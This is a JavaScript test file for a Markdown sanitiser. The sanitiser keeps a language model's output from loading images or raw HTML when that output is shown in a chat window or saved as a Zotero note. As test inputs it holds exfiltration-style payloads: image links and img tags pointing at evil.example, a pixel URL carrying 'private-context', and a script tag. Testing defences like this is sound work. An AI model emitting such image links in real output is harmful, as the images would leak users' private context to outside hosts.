// A model's Markdown, made safe before it is shown (the chat window, lib/Views.js) or saved as a
// Zotero note (the runner, daemon/lib/safe-markdown.mjs): nothing in it loads by itself. A
// zero-width space keeps "!" from "[" and "<" from a tag name, with no Markdown parsing to get wrong.
const test = require("node:test");
const assert = require("node:assert/strict");
const V = require("../lib/Views.js");

const Z = "​";

async function both() {
  const { safeMarkdown } = await import("../daemon/lib/safe-markdown.mjs");
  return [["chat window", V.safeMarkdown], ["runner", safeMarkdown]];
}

test("safeMarkdown: an invisible space breaks images and tags; nothing visible changes", async () => {
  for (const [name, fn] of await both()) {
    assert.equal(fn("See ![chart](https://evil.example/x.png)."), `See !${Z}[chart](https://evil.example/x.png).`, name);
    assert.equal(fn('<img src="u"> <a href="x">x</a> <!-- c -->'), `<${Z}img src="u"> <${Z}a href="x">x<${Z}/a> <${Z}!-- c -->`, name);
    assert.equal(fn("a < b, 3<4, [doi](https://doi.org/1), **bold**"), "a < b, 3<4, [doi](https://doi.org/1), **bold**", name);
    const sample = "code `![x](y)` and ```\n<img>\n```\n\\![z](w) ![[n]](m)";
    assert.equal(fn(sample).split(Z).join(""), sample, name); // only the invisible space is added
    assert.equal(fn(""), "", name);
  }
});

test("no way back to an image or a tag: every variant, through a Markdown renderer (both implementations)", async () => {
  const { marked } = await import("../daemon/node_modules/marked/lib/marked.esm.js");
  const url = "https://example.invalid/pixel?q=private-context";
  const shapes = [
    `![a](${url})`, `![a][r]\n\n[r]: ${url}`, `![a]\n\n[a]: ${url}`, `![[a]](${url})`, `![a](<${url}>)`,
    `[![a](${url})](https://x.example)`, `<img src="${url}">`, `<IMG SRC=${url}>`, `<p><img src=${url}></p>`,
    // code spans and fences a parser could misjudge
    "`" + `![a](${url})` + "``", "\\`" + `![a](${url})` + "`", "``" + `![a](${url})` + "`",
    "- item\n  ```\n  code\n- next\n" + `![a](${url})`, "> ```\n" + `![a](${url})`, "```js`x\n" + `![a](${url})`,
    "~~~\n```\n~~~\n" + `![a](${url})`, "```\n" + `![a](${url})`,
  ];
  const prefixes = ["", "x ", "`code` ", "*", "> ", "- ", "1. ", "**b** ", "    "];
  for (const [name, fn] of await both()) {
    for (const shape of shapes) {
      for (const prefix of prefixes) {
        for (let n = 0; n <= 5; n++) {
          const input = prefix + "\\".repeat(n) + shape;
          const html = marked.parse(fn(input), { gfm: true });
          assert.doesNotMatch(html, /<img|<p><img|<a href="x"|<IMG/i, `${name}: ${JSON.stringify(input)} → ${html}`);
          assert.doesNotMatch(html.replace(/<\/?(p|code|pre|a|strong|em|ul|ol|li|blockquote|br|hr)\b[^>]*>/g, ""), /<[a-z]/i, `${name}: a raw tag from ${JSON.stringify(input)} → ${html}`);
        }
      }
    }
  }
});

test("a note the runner writes has no <img> and no raw tag from the model; links and formatting stay", async () => {
  const { safeMarkdown } = await import("../daemon/lib/safe-markdown.mjs");
  const { marked } = await import("../daemon/node_modules/marked/lib/marked.esm.js");
  const answer = 'Findings ![c](https://evil.example/c.png?d=1) <img src="https://evil.example/i.png"> <script>x()</script> **bold** [doi](https://doi.org/1)';
  const html = marked.parse(safeMarkdown(answer), { gfm: true });
  assert.doesNotMatch(html, /<img|<script/i);
  assert.match(html, /<a href="https:\/\/evil\.example\/c\.png\?d=1">c<\/a>/); // only a link: opens when clicked
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<a href="https:\/\/doi\.org\/1">doi<\/a>/);
});
